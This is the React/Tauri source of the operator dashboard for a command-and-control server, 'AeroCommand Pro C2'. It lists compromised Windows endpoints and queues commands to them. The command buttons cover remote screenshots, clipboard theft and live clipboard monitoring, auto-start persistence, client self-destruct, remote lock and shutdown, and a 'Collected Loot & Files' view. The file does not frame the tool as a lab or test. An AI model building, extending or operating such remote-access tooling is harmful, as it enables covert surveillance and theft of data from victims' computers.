import React, { useState, useEffect, useRef } from 'react';
import { 
  LayoutDashboard, Monitor, Terminal as TermIcon, FolderOpen, 
  Clipboard, Database, Settings, Play, Square, RefreshCw, Send, ShieldCheck, Cpu, HardDrive
} from 'lucide-react';
import { invoke } from '@tauri-apps/api/core';

interface Client {
  id: string;
  host: string;
  ip: string;
  pid: number;
  os: string;
  user: string;
  admin: boolean;
  first_seen: string;
  last_seen: string;
  status: string;
  cpu_usage: number;
  ram_usage: number;
  disk_usage: number;
  net_usage: number;
}

interface CommandLog {
  id: number;
  client_id: string;
  command: string;
  output: string;
  timestamp: string;
  status: string;
}

const Tooltip = ({ children, text, position = 'top' }: { children: React.ReactNode, text: string, position?: 'top' | 'bottom' | 'left' | 'right' }) => {
  const posClasses = {
    top: 'bottom-full left-1/2 -translate-x-1/2 mb-2',
    bottom: 'top-full left-1/2 -translate-x-1/2 mt-2',
    left: 'right-full top-1/2 -translate-y-1/2 mr-2',
    right: 'left-full top-1/2 -translate-y-1/2 ml-2'
  };

  return (
    <div className="group relative flex items-center">
      {children}
      <div className={`absolute z-50 invisible group-hover:visible opacity-0 group-hover:opacity-100 transition-all duration-200 pointer-events-none whitespace-nowrap bg-slate-800 text-slate-100 text-[10px] px-2 py-1 rounded border border-c2border shadow-xl ${posClasses[position]}`}>
        {text}
        <div className={`absolute w-2 h-2 bg-slate-800 border-c2border transform rotate-45 ${
          position === 'top' ? 'bottom-[-5px] left-1/2 -translate-x-1/2 border-r border-b' :
          position === 'bottom' ? 'top-[-5px] left-1/2 -translate-x-1/2 border-l border-t' :
          position === 'left' ? 'right-[-5px] top-1/2 -translate-y-1/2 border-r border-t' :
          'left-[-5px] top-1/2 -translate-y-1/2 border-l border-b'
        }`}></div>
      </div>
    </div>
  );
};

export default function App() {
  const [activeTab, setActiveTab] = useState<'dashboard' | 'endpoints' | 'terminal' | 'files' | 'clipboard' | 'database' | 'settings'>('dashboard');
  const [uptime, setUptime] = useState('0:00:00');
  const [startTime] = useState(Date.now());
  const [serverRunning, setServerRunning] = useState(true);
  const [serverPort, setServerPort] = useState('9540');
  
  // Dashboard Metrics & Graphs
  const [cpuUsage, setCpuUsage] = useState(0);
  const [ramUsage, setRamUsage] = useState(0);
  const [netUsage, setNetUsage] = useState(0);
  const [diskUsage, setDiskUsage] = useState(0);
  const [cpuHistory, setCpuHistory] = useState<number[]>(new Array(20).fill(0));
  const [ramHistory, setRamHistory] = useState<number[]>(new Array(20).fill(0));
  const [netHistory, setNetHistory] = useState<number[]>(new Array(20).fill(0));
  const [diskHistory, setDiskHistory] = useState<number[]>(new Array(20).fill(0));

  // Real State from Backend
  const [clients, setClients] = useState<Client[]>([]);
  const [logs, setLogs] = useState<CommandLog[]>([]);
  const [printedLogIds, setPrintedLogIds] = useState<Set<number>>(new Set());

  // Terminal State
  const [termInput, setTermInput] = useState('');
  const [termLogs, setTermLogs] = useState<string[]>([
    "[+] AeroCommand Pro C2 Server v3.5 initialized",
    "[+] Listening on port 9540...",
  ]);
  const [suggestions, setSuggestions] = useState<string[]>([]);
  const quickCommands = [
    { label: "screenshot", cmd: "screenshot", tip: "Capture remote screen" },
    { label: "sysinfo", cmd: "sysinfo", tip: "Get system details" },
    { label: "clip", cmd: "clip", tip: "Read clipboard" },
    { label: "clipwatch", cmd: "clipwatch", tip: "Monitor clipboard" },
    { label: "clipstop", cmd: "clipstop", tip: "Stop monitoring" },
    { label: "tasklist", cmd: "tasklist", tip: "Show running apps" },
    { label: "whoami", cmd: "whoami", tip: "Current user info" },
    { label: "ipconfig", cmd: "ipconfig", tip: "Network settings" },
    { label: "dir", cmd: "dir", tip: "List files" },
    { label: "kill", cmd: "kill", tip: "Self-destruct client" },
    { label: "pwd", cmd: "pwd", tip: "Current directory" },
    { label: "ls", cmd: "ls", tip: "Browse folders" },
    { label: "persist", cmd: "persist", tip: "Set auto-start" },
    { label: "message", cmd: "dialog Hello|AeroCommand", tip: "Show popup alert" },
    { label: "speed", cmd: "sleep 10", tip: "Set check-in delay" },
    { label: "calc", cmd: "calc", tip: "Open calculator" },
    { label: "notepad", cmd: "notepad", tip: "Open notepad" },
    { label: "lock", cmd: "rundll32.exe user32.dll,LockWorkStation", tip: "Lock remote PC" },
    { label: "shutdown", cmd: "shutdown /s /t 60", tip: "Turn off PC" },
    { label: "restart", cmd: "shutdown /r /t 60", tip: "Reboot PC" }
  ];

  const scrollRef = useRef<HTMLDivElement>(null);

  // Auto-scroll to bottom of terminal
  useEffect(() => {
    if (scrollRef.current) {
      scrollRef.current.scrollTop = scrollRef.current.scrollHeight;
    }
  }, [termLogs]);

  const logsRef = useRef<CommandLog[]>([]);
  const printedIdsRef = useRef<Set<number>>(new Set());

  // Data Fetching Ticker
  useEffect(() => {
    const fetchData = async () => {
      try {
        const backendClients = await invoke<Client[]>('get_clients');
        const backendLogs = await invoke<CommandLog[]>('get_logs');
        setClients(backendClients);
        
        const terminalUpdates: string[] = [];
        const currentPrintedIds = printedIdsRef.current;
        let hasNewPrinted = false;

        backendLogs.forEach(log => {
          if (log.status === 'SUCCESS' && !currentPrintedIds.has(log.id)) {
            terminalUpdates.push(`[+] Result from ${log.client_id}:`);
            terminalUpdates.push(log.output);
            currentPrintedIds.add(log.id);
            hasNewPrinted = true;
          }
        });

        if (terminalUpdates.length > 0) {
          setTermLogs(prev => [...prev, ...terminalUpdates]);
        }
        
        if (hasNewPrinted) {
          setPrintedLogIds(new Set(currentPrintedIds));
        }

        setLogs(backendLogs);
        logsRef.current = backendLogs;
      } catch (err) {
        console.error("Failed to fetch data from backend", err);
      }
    };

    const interval = setInterval(fetchData, 2000);
    return () => clearInterval(interval);
  }, []);

  // Uptime & Resource Ticker
  useEffect(() => {
    const timer = setInterval(() => {
      const diff = Math.floor((Date.now() - startTime) / 1000);
      const hrs = Math.floor(diff / 3600);
      const mins = Math.floor((diff % 3600) / 60);
      const secs = diff % 60;
      setUptime(`${hrs}:${mins < 10 ? '0' : ''}${mins}:${secs < 10 ? '0' : ''}${secs}`);

      // Use real telemetry from the first active client if available
      // In a real scenario, you might want to track which client is selected
      const activeClient = clients.length > 0 ? clients[0] : null;
      
      const newCpu = activeClient ? activeClient.cpu_usage : 0;
      const newRam = activeClient ? activeClient.ram_usage : 0;
      const newNet = activeClient ? activeClient.net_usage : 0;
      const newDisk = activeClient ? activeClient.disk_usage : 0;
      
      setCpuUsage(newCpu);
      setRamUsage(newRam);
      setNetUsage(newNet);
      setDiskUsage(newDisk);

      setCpuHistory(prev => [...prev.slice(1), newCpu]);
      setRamHistory(prev => [...prev.slice(1), newRam]);
      setNetHistory(prev => [...prev.slice(1), newNet]);
      setDiskHistory(prev => [...prev.slice(1), newDisk]);
    }, 1000);
    return () => clearInterval(timer);
  }, [startTime, clients]);

  // Autocomplete handling
  const handleInputChange = (val: string) => {
    setTermInput(val);
    if (!val.trim()) {
      setSuggestions([]);
      return;
    }
    const matches = quickCommands
      .filter(item => item.label.toLowerCase().includes(val.toLowerCase()) || item.cmd.toLowerCase().includes(val.toLowerCase()))
      .map(item => item.cmd);
    setSuggestions(matches);
  };

  const executeCommand = async (cmd: string) => {
    if (!cmd.trim() || clients.length === 0) return;
    
    const targetId = clients[0].id; // Default to first client for demo
    setTermLogs(prev => [...prev, `> ${cmd}`]);
    
    try {
      await invoke('send_command', { clientId: targetId, command: cmd });
      setTermLogs(prev => [...prev, `[+] Command queued for ${targetId}`]);
    } catch (err) {
      setTermLogs(prev => [...prev, `[-] Error sending command: ${err}`]);
    }

    setTermInput('');
    setSuggestions([]);
  };

  return (
    <div className="flex h-screen w-screen bg-c2bg text-slate-100 overflow-hidden font-sans select-none border border-c2border">
      
      {/* SIDEBAR */}
      <div className="w-64 bg-c2sidebar border-r border-c2border flex flex-col justify-between">
        <div>
          {/* Header */}
          <div className="p-5 border-b border-c2border flex items-center space-x-3">
            <div className="h-8 w-8 bg-c2accent flex items-center justify-center font-bold text-slate-900 rounded">
              AC
            </div>
            <div>
              <h1 className="font-bold tracking-wider text-sm">AEROCAPS</h1>
              <p className="text-xs text-slate-400">Command & Control v3.5</p>
            </div>
          </div>

          {/* Navigation */}
          <nav className="p-3 space-y-1">
            {[
              { id: 'dashboard', label: 'Dashboard', icon: LayoutDashboard, tip: 'View system overview and metrics' },
              { id: 'endpoints', label: 'Endpoints', icon: Monitor, tip: 'Manage connected remote machines' },
              { id: 'terminal', label: 'Command Center', icon: TermIcon, tip: 'Execute commands and view output' },
              { id: 'files', label: 'File & Loot', icon: FolderOpen, tip: 'Browse and download collected files' },
              { id: 'clipboard', label: 'Clipboard Stream', icon: Clipboard, tip: 'Monitor remote clipboard changes' },
              { id: 'database', label: 'History & Logs', icon: Database, tip: 'Review command execution history' },
              { id: 'settings', label: 'Server Config', icon: Settings, tip: 'Configure C2 server parameters' },
            ].map((item) => {
              const Icon = item.icon;
              const isActive = activeTab === item.id;
              return (
                <Tooltip key={item.id} text={item.tip} position="right">
                  <button
                    onClick={() => setActiveTab(item.id as any)}
                    className={`w-full flex items-center space-x-3 px-4 py-2.5 rounded text-sm font-medium transition-colors ${
                      isActive 
                        ? 'bg-c2accent text-slate-900 font-semibold shadow-sm' 
                        : 'text-slate-400 hover:bg-slate-800 hover:text-slate-200'
                    }`}
                  >
                    <Icon className="w-4 h-4" />
                    <span>{item.label}</span>
                  </button>
                </Tooltip>
              );
            })}
          </nav>
        </div>

        {/* Footer Status */}
        <div className="p-4 border-t border-c2border bg-slate-900/50">
          <div className="flex items-center justify-between text-xs text-slate-400 mb-1">
            <span>Listener Status</span>
            <span className="flex items-center text-emerald-400 font-medium">
              <span className="h-2 w-2 rounded-full bg-emerald-400 mr-1.5 animate-pulse"></span>
              ACTIVE
            </span>
          </div>
          <div className="text-[11px] text-slate-500 font-mono">Port: {serverPort} | Clients: {clients.length}</div>
        </div>
      </div>

      {/* MAIN CONTAINER */}
      <div className="flex-1 flex flex-col overflow-hidden bg-c2bg">
        
        {/* TOP BAR */}
        <header className="h-14 border-b border-c2border bg-c2sidebar/50 px-6 flex items-center justify-between">
          <div className="flex items-center space-x-4">
            <span className="text-xs uppercase tracking-wider text-slate-400 font-semibold">Current View:</span>
            <span className="text-sm font-bold text-c2accent uppercase tracking-wide">{activeTab}</span>
          </div>
          <div className="flex items-center space-x-3">
            <Tooltip text="The currently selected remote machine" position="bottom">
              <span className="text-xs px-2.5 py-1 bg-c2card border border-c2border rounded font-mono text-slate-300">
                Target: {clients.length > 0 ? clients[0].host : 'None Selected'}
              </span>
            </Tooltip>
            <Tooltip text={serverRunning ? "Shut down the C2 listener" : "Start the C2 listener"} position="bottom">
              <button 
                onClick={() => setServerRunning(!serverRunning)}
                className={`px-3 py-1.5 rounded text-xs font-semibold flex items-center space-x-1.5 border transition-colors ${
                  serverRunning 
                    ? 'bg-red-500/10 text-red-400 border-red-500/30 hover:bg-red-500/20' 
                    : 'bg-emerald-500/10 text-emerald-400 border-emerald-500/30 hover:bg-emerald-500/20'
                }`}
              >
                {serverRunning ? <Square className="w-3 h-3 fill-current" /> : <Play className="w-3 h-3 fill-current" />}
                <span>{serverRunning ? 'Stop Server' : 'Start Server'}</span>
              </button>
            </Tooltip>
          </div>
        </header>

        {/* CONTENT AREA */}
        <main className="flex-1 overflow-auto p-6">
          
          {/* 1. DASHBOARD VIEW */}
          {activeTab === 'dashboard' && (
            <div className="space-y-6">
              {/* Metric Cards */}
              <div className="grid grid-cols-4 gap-4">
                {[
                  { label: 'Active Endpoints', val: clients.length, icon: Monitor, color: 'text-c2accent', tip: 'Number of connected remote clients' },
                  { label: 'Server Uptime', val: uptime, icon: RefreshCw, color: 'text-emerald-400', tip: 'Time since C2 server started' },
                  { label: 'Total Logs', val: logs.length, icon: Database, color: 'text-purple-400', tip: 'Total commands executed' },
                  { label: 'Current Target', val: clients.length > 0 ? clients[0].host : 'NONE', icon: ShieldCheck, color: 'text-amber-400', tip: 'Selected machine for commands' },
                ].map((stat, idx) => {
                  const Icon = stat.icon;
                  return (
                    <Tooltip key={idx} text={stat.tip} position="top">
                      <div className="bg-c2card border border-c2border p-4 rounded shadow-sm w-full">
                        <div className="flex items-center justify-between text-slate-400 mb-2">
                          <span className="text-xs font-medium">{stat.label}</span>
                          <Icon className={`w-4 h-4 ${stat.color}`} />
                        </div>
                        <div className="text-2xl font-bold font-mono tracking-tight">{stat.val}</div>
                      </div>
                    </Tooltip>
                  );
                })}
              </div>

              {/* Active Endpoints Table */}
              <div className="bg-c2card border border-c2border rounded overflow-hidden">
                <div className="p-4 border-b border-c2border bg-slate-900/30 flex items-center justify-between">
                  <div className="flex items-center space-x-2">
                    <Monitor className="w-4 h-4 text-c2accent" />
                    <h2 className="text-xs font-bold uppercase tracking-wider text-slate-400">Connected Endpoints</h2>
                  </div>
                  <button 
                    onClick={() => invoke('get_clients').then(setClients)}
                    className="text-[10px] text-slate-500 hover:text-c2accent flex items-center space-x-1 transition-colors"
                  >
                    <RefreshCw className="w-3 h-3" />
                    <span>REFRESH</span>
                  </button>
                </div>
                <div className="overflow-x-auto">
                  {clients.length === 0 ? (
                    <div className="p-12 text-center text-slate-500 text-xs italic">No active endpoints connected...</div>
                  ) : (
                    <table className="w-full text-left border-collapse">
                      <thead>
                        <tr className="border-b border-c2border bg-slate-900/50 text-[10px] uppercase tracking-wider text-slate-500 font-bold">
                          <th className="p-3">Client ID</th>
                          <th className="p-3">Host / User</th>
                          <th className="p-3">IP Address</th>
                          <th className="p-3 text-center">PID</th>
                          <th className="p-3">OS</th>
                          <th className="p-3 text-center">Status</th>
                        </tr>
                      </thead>
                      <tbody className="divide-y divide-c2border text-[11px]">
                        {clients.map((c, i) => (
                          <tr key={i} className="hover:bg-slate-800/30 transition-colors">
                            <td className="p-3 font-mono text-c2accent">{c.id}</td>
                            <td className="p-3 font-bold text-slate-200">{c.host} <span className="text-slate-500 font-normal ml-1">({c.user})</span></td>
                            <td className="p-3 font-mono text-slate-400">{c.ip}</td>
                            <td className="p-3 font-mono text-center text-slate-400">{c.pid}</td>
                            <td className="p-3 text-slate-400 truncate max-w-[150px]">{c.os}</td>
                            <td className="p-3 text-center">
                              <span className="px-2 py-0.5 bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-[9px] font-bold rounded">
                                {c.status}
                              </span>
                            </td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  )}
                </div>
              </div>

              {/* Bottom Grid: Recent Activity & Server Health */}
              <div className="grid grid-cols-3 gap-6">
                {/* Recent Activity Feed */}
                <div className="col-span-2 bg-c2card border border-c2border rounded overflow-hidden flex flex-col">
                  <div className="p-4 border-b border-c2border bg-slate-900/30 flex items-center justify-between">
                    <h2 className="text-xs font-bold uppercase tracking-wider text-slate-400">Recent C2 Activity</h2>
                    <span className="text-[10px] bg-c2accent/10 text-c2accent px-2 py-0.5 rounded border border-c2accent/20">LIVE FEED</span>
                  </div>
                  <div className="divide-y divide-c2border max-h-64 overflow-y-auto flex-1">
                    {logs.length === 0 ? (
                      <div className="p-8 text-center text-slate-500 text-xs italic">Waiting for activity...</div>
                    ) : (
                      [...logs].reverse().slice(0, 6).map((log, i) => (
                        <div key={i} className="p-3 hover:bg-slate-800/30 transition-colors flex items-center justify-between">
                          <div className="flex items-center space-x-3">
                            <div className={`h-2 w-2 rounded-full ${log.status === 'SUCCESS' ? 'bg-emerald-400 shadow-[0_0_8px_rgba(52,211,153,0.5)]' : 'bg-amber-400 animate-pulse'}`}></div>
                            <div>
                              <div className="text-xs font-bold text-slate-200">{log.command} <span className="text-[10px] text-slate-500 font-normal ml-1">→ {log.client_id}</span></div>
                              <div className="text-[10px] text-slate-400 font-mono truncate max-w-md">{log.output.substring(0, 100)}...</div>
                            </div>
                          </div>
                          <div className="text-[10px] font-mono text-slate-500">{log.timestamp.split(' ')[1]}</div>
                        </div>
                      ))
                    )}
                  </div>
                </div>

                {/* Server Health & Quick Status */}
                <div className="bg-c2card border border-c2border rounded overflow-hidden flex flex-col">
                  <div className="p-4 border-b border-c2border bg-slate-900/30">
                    <h2 className="text-xs font-bold uppercase tracking-wider text-slate-400">System Health</h2>
                  </div>
                  <div className="p-5 space-y-4 flex-1">
                    <div className="space-y-2">
                      <div className="flex justify-between text-[10px] uppercase tracking-wider text-slate-500 font-bold">
                        <span>Database Integrity</span>
                        <span className="text-emerald-400">OPTIMAL</span>
                      </div>
                      <div className="h-1.5 w-full bg-slate-900 rounded-full overflow-hidden">
                        <div className="h-full w-[98%] bg-emerald-500"></div>
                      </div>
                    </div>
                    
                    <div className="space-y-2">
                      <div className="flex justify-between text-[10px] uppercase tracking-wider text-slate-500 font-bold">
                        <span>Listener Load</span>
                        <span className="text-c2accent">LOW</span>
                      </div>
                      <div className="h-1.5 w-full bg-slate-900 rounded-full overflow-hidden">
                        <div className="h-full w-[12%] bg-c2accent"></div>
                      </div>
                    </div>

                    <div className="pt-2 grid grid-cols-2 gap-2">
                      <div className="bg-slate-900/50 border border-c2border p-2 rounded text-center">
                        <div className="text-[9px] uppercase text-slate-500 font-bold mb-1">Enc. Engine</div>
                        <div className="text-[10px] font-mono text-emerald-400">XOR-0x5A</div>
                      </div>
                      <div className="bg-slate-900/50 border border-c2border p-2 rounded text-center">
                        <div className="text-[9px] uppercase text-slate-500 font-bold mb-1">DB Sync</div>
                        <div className="text-[10px] font-mono text-emerald-400">ACTIVE</div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* 2. ENDPOINTS VIEW */}
          {activeTab === 'endpoints' && (
            <div className="space-y-6">
              <div className="flex items-center justify-between">
                <h2 className="text-lg font-bold">Fleet Management</h2>
                <button onClick={() => invoke('get_clients').then(setClients)} className="px-3 py-1.5 bg-c2card border border-c2border rounded text-xs font-semibold hover:border-c2accent transition-colors flex items-center space-x-1">
                  <RefreshCw className="w-3 h-3" />
                  <span>Refresh Fleet</span>
                </button>
              </div>

              {/* OS & Arch Fleet Breakdown (Moved from Dashboard) */}
              <div className="bg-c2card border border-c2border p-5 rounded flex flex-col">
                <div className="flex items-center justify-between mb-4">
                  <div className="flex items-center space-x-2">
                    <ShieldCheck className="w-4 h-4 text-purple-400" />
                    <h2 className="text-sm font-semibold">OS & Arch Fleet Breakdown</h2>
                  </div>
                  <span className="text-[10px] text-slate-500 uppercase font-bold tracking-tighter">Target Distribution</span>
                </div>
                <div className="grid grid-cols-2 gap-8 flex-1">
                  <div className="space-y-4">
                    <h3 className="text-[10px] uppercase text-slate-500 font-bold tracking-widest">Operating Systems</h3>
                    <div className="space-y-3">
                      {[
                        { name: 'Windows 11', count: clients.filter(c => c.os.includes('11')).length, total: clients.length, color: 'bg-blue-500' },
                        { name: 'Windows 10', count: clients.filter(c => c.os.includes('10')).length, total: clients.length, color: 'bg-emerald-500' },
                        { name: 'Other', count: clients.filter(c => !c.os.includes('10') && !c.os.includes('11')).length, total: clients.length, color: 'bg-slate-600' },
                      ].map((os) => (
                        <div key={os.name} className="space-y-1">
                          <div className="flex justify-between text-[10px] font-mono">
                            <span className="text-slate-300">{os.name}</span>
                            <span className="text-slate-500">{os.count} Target(s)</span>
                          </div>
                          <div className="h-1.5 w-full bg-slate-900 rounded-full overflow-hidden">
                            <div 
                              className={`h-full ${os.color} transition-all duration-500`} 
                              style={{ width: `${os.total > 0 ? (os.count / os.total) * 100 : 0}%` }}
                            ></div>
                          </div>
                        </div>
                      ))}
                    </div>
                  </div>

                  <div className="flex flex-col justify-center">
                    <h3 className="text-[10px] uppercase text-slate-500 font-bold tracking-widest mb-4">Architecture Summary</h3>
                    <div className="grid grid-cols-2 gap-4">
                      <div className="bg-slate-900/50 border border-c2border p-4 rounded text-center">
                        <div className="text-[10px] uppercase text-slate-500 font-bold mb-1">x64 (AMD64)</div>
                        <div className="text-2xl font-bold font-mono text-c2accent">{clients.filter(c => c.os.toLowerCase().includes('64')).length}</div>
                      </div>
                      <div className="bg-slate-900/50 border border-c2border p-4 rounded text-center">
                        <div className="text-[10px] uppercase text-slate-500 font-bold mb-1">x86 (i386)</div>
                        <div className="text-2xl font-bold font-mono text-slate-400">{clients.filter(c => !c.os.toLowerCase().includes('64')).length}</div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              <div className="bg-c2card border border-c2border rounded overflow-hidden">
                {clients.length === 0 ? (
                  <div className="p-12 text-center flex flex-col items-center justify-center space-y-3">
                    <Monitor className="w-12 h-12 text-slate-500" />
                    <h3 className="text-base font-bold text-slate-200">No active endpoints connected</h3>
                    <p className="text-xs text-slate-400">Endpoints will appear here automatically when they check in.</p>
                  </div>
                ) : (
                  <table className="w-full text-left border-collapse">
                    <thead>
                      <tr className="border-b border-c2border bg-slate-900/50 text-xs text-slate-400">
                        <th className="p-3">Client ID</th>
                        <th className="p-3">Host / User</th>
                        <th className="p-3">IP Address</th>
                        <th className="p-3">PID</th>
                        <th className="p-3">OS</th>
                        <th className="p-3">Status</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-c2border text-sm">
                      {clients.map((c, i) => (
                        <tr key={i} className="hover:bg-slate-800/50 transition-colors">
                          <td className="p-3 font-mono text-xs text-c2accent">{c.id}</td>
                          <td className="p-3 font-medium">{c.host} <span className="text-slate-400 text-xs">({c.user})</span></td>
                          <td className="p-3 font-mono text-xs">{c.ip}</td>
                          <td className="p-3 font-mono text-xs">{c.pid}</td>
                          <td className="p-3 text-xs text-slate-300">{c.os}</td>
                          <td className="p-3">
                            <span className="px-2 py-0.5 bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-[11px] font-semibold rounded">
                              {c.status}
                            </span>
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                )}
              </div>
            </div>
          )}

          {/* 3. TERMINAL VIEW */}
          {activeTab === 'terminal' && (
            <div className="h-full flex flex-col space-y-4">
              <div className="bg-c2card border border-c2border p-3 rounded flex items-center justify-between">
                <span className="text-xs font-mono text-c2accent">Target: {clients.length > 0 ? clients[0].id : 'None Selected'}</span>
                <span className="text-xs text-slate-400">Interactive C2 Shell</span>
              </div>

              <div 
                ref={scrollRef}
                className="flex-1 bg-slate-950 border border-c2border rounded p-4 font-mono text-[11px] overflow-y-auto space-y-1 shadow-inner scrollbar-thin scrollbar-thumb-c2border scrollbar-track-transparent"
              >
                {termLogs.map((log, i) => (
                  <div 
                    key={i} 
                    className={`whitespace-pre-wrap break-all leading-relaxed ${
                      log.startsWith('>') ? 'text-c2accent font-bold mt-2' : 
                      log.startsWith('[+]') ? 'text-emerald-400 mt-1' : 
                      'text-slate-300 pl-4 border-l border-slate-800 ml-1 py-1'
                    }`}
                  >
                    {log}
                  </div>
                ))}
              </div>

              <div className="flex items-center space-x-2 overflow-x-auto pb-1">
                {quickCommands.map((item) => (
                  <Tooltip key={item.label} text={item.tip} position="top">
                    <button
                      onClick={() => executeCommand(item.cmd)}
                      className="px-2.5 py-1 bg-c2card border border-c2border rounded text-xs font-mono hover:bg-c2accent hover:text-slate-950 transition-colors whitespace-nowrap"
                    >
                      {item.label}
                    </button>
                  </Tooltip>
                ))}
              </div>

              <div className="relative">
                {suggestions.length > 0 && (
                  <div className="absolute bottom-full mb-1 left-0 w-full bg-c2card border border-c2border rounded shadow-lg overflow-hidden z-10">
                    {suggestions.map((sug, i) => (
                      <div
                        key={i}
                        onClick={() => { setTermInput(sug); setSuggestions([]); }}
                        className="px-3 py-2 text-xs font-mono hover:bg-c2accent hover:text-slate-950 cursor-pointer border-b border-c2border/50 last:border-0"
                      >
                        {sug}
                      </div>
                    ))}
                  </div>
                )}
                <div className="flex space-x-2">
                  <input
                    type="text"
                    value={termInput}
                    onChange={(e) => handleInputChange(e.target.value)}
                    onKeyDown={(e) => e.key === 'Enter' && executeCommand(termInput)}
                    placeholder="Enter command..."
                    className="flex-1 bg-c2card border border-c2border rounded px-4 py-2.5 text-sm font-mono focus:outline-none focus:border-c2accent"
                  />
                  <Tooltip text="Send command to remote machine" position="top">
                    <button
                      onClick={() => executeCommand(termInput)}
                      className="px-5 py-2.5 bg-c2accent text-slate-950 font-semibold rounded hover:bg-c2accenthover transition-colors flex items-center space-x-2"
                    >
                      <Send className="w-4 h-4" />
                      <span>Execute</span>
                    </button>
                  </Tooltip>
                </div>
              </div>
            </div>
          )}

          {/* 4. FILES VIEW */}
          {activeTab === 'files' && (
            <div className="space-y-4">
              <div className="flex items-center justify-between">
                <h2 className="text-lg font-bold">Collected Loot & Files</h2>
              </div>
              <div className="bg-c2card border border-c2border rounded p-12 text-center flex flex-col items-center justify-center space-y-3">
                <FolderOpen className="w-12 h-12 text-slate-500" />
                <h3 className="text-base font-bold text-slate-200">No files collected yet</h3>
              </div>
            </div>
          )}

          {/* 5. CLIPBOARD VIEW */}
          {activeTab === 'clipboard' && (
            <div className="h-full flex flex-col space-y-4">
              <h2 className="text-lg font-bold">Clipboard Stream</h2>
              <div className="flex-1 bg-slate-950 border border-c2border rounded p-4 font-mono text-xs text-slate-300">
                [+] Waiting for clipboard updates...
              </div>
            </div>
          )}

          {/* 6. DATABASE VIEW */}
          {activeTab === 'database' && (
            <div className="space-y-4">
              <h2 className="text-lg font-bold">Command Logs</h2>
              <div className="bg-c2card border border-c2border rounded overflow-hidden">
                <table className="w-full text-left border-collapse">
                  <thead>
                    <tr className="border-b border-c2border bg-slate-900/50 text-xs text-slate-400">
                      <th className="p-3">ID</th>
                      <th className="p-3">Client</th>
                      <th className="p-3">Command</th>
                      <th className="p-3">Timestamp</th>
                      <th className="p-3">Status</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-c2border text-sm font-mono text-xs">
                    {logs.map((l, i) => (
                      <tr key={i} className="hover:bg-slate-800/50">
                        <td className="p-3">#{l.id}</td>
                        <td className="p-3 text-c2accent">{l.client_id}</td>
                        <td className="p-3">{l.command}</td>
                        <td className="p-3 text-slate-400">{l.timestamp}</td>
                        <td className="p-3 text-emerald-400">{l.status}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
          )}

          {/* 7. SETTINGS VIEW */}
          {activeTab === 'settings' && (
            <div className="space-y-6 max-w-xl">
              <h2 className="text-lg font-bold">Server Configuration</h2>
              <div className="bg-c2card border border-c2border p-6 rounded space-y-4">
                <div>
                  <label className="block text-xs font-semibold text-slate-400 mb-1">C2 Server Port</label>
                  <input type="text" value={serverPort} readOnly className="w-full bg-slate-900 border border-c2border rounded px-3 py-2 text-sm font-mono opacity-50" />
                </div>
              </div>
            </div>
          )}

        </main>
      </div>
    </div>
  );
}
